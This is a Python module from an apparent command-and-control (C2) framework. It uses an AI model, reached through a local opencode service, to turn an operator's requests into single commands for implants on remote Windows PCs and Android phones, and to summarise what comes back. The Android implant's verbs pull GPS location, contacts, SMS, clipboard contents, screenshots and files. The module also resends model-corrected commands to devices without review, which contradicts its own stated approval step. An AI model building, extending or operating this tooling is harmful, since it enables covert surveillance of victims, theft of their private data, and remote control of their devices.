"""cybai.py — NL -> command planner backed by the local opencode service.

The dashboard prompt box ("master") is handled in two phases so the operator
always sees what is about to run before it runs:

  1. plan()      natural language  -> a single Windows cmd.exe command
  2. interpret() command output    -> a plain-English answer for the operator

If the output looks like a failure, plan() is re-run once with the error fed
back so the model can correct itself, bounded by MAX_REPLANS.

opencode service contract (verified against 2.0.18):
  - base URL          : first line of `opencode service status`
  - auth              : HTTP Basic, user "opencode", password from
                        ~/.config/opencode/service.json
  - POST   /api/session                      -> {"data":{"id":"ses_..."}}
  - POST   /api/session/{id}/prompt {"text"} -> 200, echoes the USER message
  - GET    /api/session/{id}/message         -> assistant text in content[].text
  - a message with type "idle" carries outcome "succeeded" | "failed"

Two traps worth remembering, both of which fail silently:
  - Model.Ref needs BOTH "id" and "providerID"; missing either is a 400.
  - "id" must be the BARE model id. "provider/model" gets the provider
    prefixed again and the session dies with
    ModelUnavailableError: Model unavailable: provider/provider/model.
  - Replies arrive in "content", not "parts". Polling "parts" returns empty
    forever and looks like a hang.
"""

import base64
import json
import os
import subprocess
import threading
import time
import urllib.error
import urllib.request

SERVICE_STATUS = ['opencode', 'service', 'status']
SERVICE_CFG = os.path.expanduser('~/.config/opencode/service.json')

# Bare model id -- do NOT prefix with the provider, see module docstring.
MODEL_ID = os.environ.get('CYB_AI_MODEL', 'space-bunny-free')
MODEL_PROVIDER = os.environ.get('CYB_AI_PROVIDER', 'opencode')
AGENT = os.environ.get('CYB_AI_AGENT', 'cyb-instructor')

REPLY_TIMEOUT = float(os.environ.get('CYB_AI_TIMEOUT', '120'))
MAX_REPLANS = int(os.environ.get('CYB_AI_REPLANS', '1'))
MAX_OUTPUT_FEEDBACK = 6000

# Planning is a stateless NL -> command mapping, and a shared session measurably
# degrades it: with three prompts in one session the model drifted onto the
# previous turn's answer ("who am i running as" -> `whoami /user`, and then
# "show me the hostname" -> `whoami /user` as well). With a fresh session per
# plan all three came back correct. A wrong command is precisely what the
# dashboard approval step exists to catch, so default to stateless.
# Set CYB_AI_CONTINUITY=1 to keep one conversation per client instead.
CONTINUITY = os.environ.get('CYB_AI_CONTINUITY', '0') == '1'

# One opencode session per C2 client, so follow-ups keep their context
# ("now the parent directory" works without restating the path).
_sessions = {}
_lock = threading.Lock()
_base_cache = {}


class AIError(Exception):
    """Anything the operator should see verbatim in the dashboard."""


# ---------------------------------------------------------------- transport


def _discover():
    """Resolve (base_url, basic_auth_token), cached for the process."""
    with _lock:
        if _base_cache:
            return _base_cache['base'], _base_cache['token']
    try:
        out = subprocess.run(SERVICE_STATUS, capture_output=True, text=True,
                             timeout=20).stdout.strip()
    except (OSError, subprocess.SubprocessError) as e:
        raise AIError(f'cannot run `opencode service status`: {e}')
    if not out:
        raise AIError('opencode service status returned nothing -- is the '
                      'service running? try: opencode service restart')
    base = out.splitlines()[0].strip().rstrip('/')

    try:
        with open(SERVICE_CFG) as f:
            pw = json.load(f)['password']
    except (OSError, KeyError, ValueError) as e:
        raise AIError(f'cannot read {SERVICE_CFG}: {e}')

    token = base64.b64encode(f'opencode:{pw}'.encode()).decode()
    with _lock:
        _base_cache['base'] = base
        _base_cache['token'] = token
    return base, token


def _call(method, path, body=None, timeout=REPLY_TIMEOUT):
    base, token = _discover()
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header('Authorization', 'Basic ' + token)
    if data:
        req.add_header('Content-Type', 'application/json')
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode()
    except urllib.error.HTTPError as e:
        detail = e.read().decode('utf-8', 'replace')[:300]
        raise AIError(f'opencode {method} {path} -> HTTP {e.code}: {detail}')
    except (urllib.error.URLError, OSError) as e:
        raise AIError(f'opencode unreachable at {base}: {e}')
    try:
        return json.loads(body or '{}')
    except ValueError:
        raise AIError(f'opencode returned non-JSON: {body[:200]}')


def _model_ref():
    return {'id': MODEL_ID, 'providerID': MODEL_PROVIDER, 'modelID': MODEL_ID}


# ---------------------------------------------------------------- session


def reset_session(client_id):
    """Forget the cached session so the next prompt starts clean."""
    with _lock:
        _sessions.pop(client_id, None)


def _session(client_id):
    with _lock:
        sid = _sessions.get(client_id)
    if sid:
        return sid
    j = _call('POST', '/api/session', {'model': _model_ref(), 'agent': AGENT})
    sid = (j.get('data') or {}).get('id')
    if not sid:
        raise AIError(f'could not create opencode session: {str(j)[:200]}')
    with _lock:
        _sessions[client_id] = sid
    return sid


def _ask(client_id, text, fresh=False):
    """Send one prompt and block until the assistant replies.

    Returns the reply text, or raises AIError with the service's own message.
    """
    if fresh:
        with _lock:
            _sessions.pop(client_id, None)
    sid = _session(client_id)

    _call('POST', f'/api/session/{sid}/prompt', {'text': text})

    deadline = time.time() + REPLY_TIMEOUT
    while time.time() < deadline:
        time.sleep(1.0)
        msgs = (_call('GET', f'/api/session/{sid}/message', timeout=30)
                .get('data') or [])

        for m in msgs:
            if m.get('outcome') == 'failed':
                payload = m.get('payload') or {}
                raise AIError(f'opencode model call failed: '
                              f'{json.dumps(payload)[:300] or m.get("id")}')
            if m.get('type') == 'assistant':
                # Replies live in content[], not parts[].
                text_out = ''.join(
                    p.get('text', '') for p in (m.get('content') or [])
                    if p.get('type') == 'text').strip()
                if text_out:
                    return text_out
    raise AIError(f'no model reply within {REPLY_TIMEOUT:.0f}s')


# ---------------------------------------------------------------- platforms
# Windows and Android are different targets, not a cosmetic difference:
#   - Windows: the implant runs bare text through cmd.exe /c.
#   - Android: the implant runs bare text through /system/bin/sh -c, so shell
#     commands go out unprefixed, the same shape as Windows.
#
# _ANDROID_VERBS is the optional prefix table. A line with no prefix is shell
# work; only the verbs below need a prefix, and the implant rejects a prefix
# it does not recognise.

_ANDROID_VERBS = (
    'DOWNLOAD', 'UPLOAD', 'LISTFILES', 'INFO', 'GPS', 'CONTACTS', 'SMS',
    'CLIPBOARD', 'SCREENSHOT', 'WIFI', 'VIBRATE', 'PING',
)

PLATFORMS = {
    'windows': {
        'label': 'Windows cmd.exe',
        'plan': """You translate an operator request into ONE Windows cmd.exe \
command for a remote Windows machine.

Rules, all of them mandatory:
- Reply with the command ONLY. No prose, no explanation, no markdown, no
  backticks, no code fences, no quotes around the whole thing.
- Exactly one line.
- It must run under cmd.exe, so no PowerShell cmdlets and no Unix commands.
- If one command cannot do it, return the single most useful partial command.
- Never invent a path you were not given; use relative paths or common ones.

Request: {prompt}""",
        'fix': """You are correcting a Windows cmd.exe command that failed on a \
remote machine.

Original request: {prompt}
Failed command: {command}
Output:
{output}

Reply with ONE corrected cmd.exe command and nothing else. No prose, no markdown.
If the output shows the command actually succeeded, repeat that same command.""",
    },
    'android': {
        'label': 'Android',
        'plan': """You translate an operator request into ONE command for a \
remote Android phone. The implant runs the line through /system/bin/sh -c, so \
a plain shell command is sent as-is with nothing in front of it.

Verbs the implant supports:
  LISTFILES:<dir>    list a directory
  INFO               device information
  DOWNLOAD:<path>    pull a file to the operator
  UPLOAD:<path>:<b64> push a file to the device
  GPS                current location
  CONTACTS           address book
  SMS                recent messages
  CLIPBOARD          clipboard contents
  SCREENSHOT         capture the screen
  WIFI               wifi state
  VIBRATE            vibrate the device
  PING               liveness check

Rules, all of them mandatory:
- Reply with the command ONLY. No prose, no markdown, no backticks, no fences.
- Exactly one line.
- Send shell work as the bare command: "ls -la" is right. Do not put a prefix
  in front of it.
- Only use a verb from the list above when the request actually needs one.
- The app is not rooted. Do not propose su, mount -o rw, or anything needing root.
- Android paths: /sdcard, /data/local/tmp, /proc, /sys. Prefer those.
- If one command cannot do it, return the single most useful partial command.

Request: {prompt}""",
        'fix': """You are correcting a command that failed on a remote Android \
phone. The implant runs the line through /system/bin/sh -c, so a plain shell \
command is sent as-is with nothing in front of it.

Original request: {prompt}
Failed command: {command}
Output:
{output}

Reply with ONE corrected command and nothing else. No prose, no markdown. Send \
shell work as the bare command, with no prefix in front of it. If the output \
shows the command actually succeeded, repeat that same command.""",
    },
}


def _platform(name):
    p = PLATFORMS.get((name or 'windows').lower())
    if not p:
        raise AIError(f'unknown platform {name!r}; expected one of '
                      f'{", ".join(sorted(PLATFORMS))}')
    return p


def _clean_command(raw):
    """Reduce a model reply to a single command line.

    Models occasionally wrap output in fences or add a sentence despite the
    instructions; strip that rather than sending junk to the implant.
    """
    if not raw:
        raise AIError('model returned an empty command')
    text = raw.strip()
    if '```' in text:
        blocks = [b.strip() for b in text.split('```')]
        blocks = [b for b in blocks if b and not b.lower().startswith(('cmd', 'bat', 'sh'))]
        if blocks:
            text = blocks[0]
    for line in text.splitlines():
        line = line.strip().strip('`').strip()
        if not line or line.startswith('#'):
            continue
        # A leading prompt artefact like "Command: dir"
        if line.lower().startswith(('command:', 'cmd:', 'answer:')):
            line = line.split(':', 1)[1].strip()
        if line:
            return line
    raise AIError(f'could not extract a command from: {raw[:200]}')


_PLAN_CACHE = {}
_plan_lock = threading.Lock()


def plan(client_id, prompt, last_output=None, last_command=None,
         platform='windows'):
    """prompt -> a single command string for the given platform.

    last_output/last_command from a failed attempt are fed back so the model
    can self-correct. Unless CONTINUITY is set, each plan starts a fresh
    session -- see the note on CONTINUITY for why that matters.
    """
    plat = _platform(platform)
    if (last_output or '').strip() and last_command:
        text = plat['fix'].format(prompt=prompt, command=last_command,
                                  output=last_output[:MAX_OUTPUT_FEEDBACK])
    else:
        text = plat['plan'].format(prompt=prompt)

    # Platform is part of the key: an identical prompt must not return the
    # Windows answer when asked for Android.
    key = text if CONTINUITY else (platform, client_id, text)
    with _plan_lock:
        cached = _PLAN_CACHE.get(key)
    if cached is not None:
        return cached

    command = _clean_command(_ask(client_id, text, fresh=not CONTINUITY))
    if platform.lower() == 'android':
        _check_android(command)
    with _plan_lock:
        if len(_PLAN_CACHE) > 256:
            _PLAN_CACHE.clear()
        _PLAN_CACHE[key] = command
    return command


def _android_prefix(command):
    """Return the verb prefix on an Android command, or None for a bare one.

    A bare command is shell work and is run through /system/bin/sh -c as-is.
    A prefix is only a prefix when the first token is a single word followed by
    a colon, so a command like "grep foo /sdcard/a:b" is still bare shell work
    and not a mislabelled verb.
    """
    head, sep, _ = command.partition(':')
    if not sep or ' ' in head or not head.strip():
        return None
    return head.strip().upper()


def _check_android(command):
    """Reject only a prefix the Android implant would not recognise."""
    verb = _android_prefix(command)
    if verb is not None and verb not in _ANDROID_VERBS:
        raise AIError(f'model produced {command!r}, whose prefix {verb!r} is '
                      f'not a known Android verb. Send shell work as the bare '
                      f'command, with no prefix.')


def _interpret_sys(platform):
    what = _platform(platform)['label']
    return f"""An operator asked for this on a remote {what} device:

{{prompt}}

Command that was run:
{{command}}

Raw output:
{{output}}

Report the result in a few short sentences. State the answer first. If it \
failed, say what went wrong. Do not invent anything that is not in the output."""


def interpret(client_id, prompt, command, output, platform='windows'):
    """Turn raw implant output into a short answer for the operator."""
    if not (output or '').strip():
        return 'The command produced no output.'
    return _ask(client_id, _interpret_sys(platform).format(
        prompt=prompt, command=command,
        output=output[:MAX_OUTPUT_FEEDBACK]), fresh=not CONTINUITY)


def replan_after_failure(client_id, prompt, command, output, platform='windows'):
    """Feed a failed command back to the model for one correction."""
    with _plan_lock:
        _PLAN_CACHE.clear()
    fixed = _clean_command(_ask(
        client_id, _platform(platform)['fix'].format(
            prompt=prompt, command=command,
            output=(output or '')[:MAX_OUTPUT_FEEDBACK])))
    # A correction is the worst place to let a bad verb through, since it is
    # about to be sent to a real device without a second look.
    if platform.lower() == 'android':
        _check_android(fixed)
    return fixed


def health():
    """Cheap readiness probe for the dashboard."""
    try:
        base, _ = _discover()
        info = _call('GET', '/api/info', timeout=10).get('data', {})
        return {'ok': True, 'base': base, 'version': info.get('version'),
                'model': f'{MODEL_PROVIDER}/{MODEL_ID}', 'agent': AGENT}
    except AIError as e:
        return {'ok': False, 'error': str(e)}
